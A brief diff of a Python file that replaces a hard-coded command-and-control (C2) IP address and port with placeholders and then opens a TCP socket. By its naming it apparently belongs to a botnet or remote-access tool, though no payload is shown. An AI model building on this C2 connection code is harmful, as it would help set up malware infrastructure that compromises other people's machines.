@@ -1,7 +1,7 @@
 import socket
 
-C2 = "45.55.18.16"
-C2PORT = 8989
+C2 = "YOUR C2 IP"
+C2PORT = #YOUR PORT
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
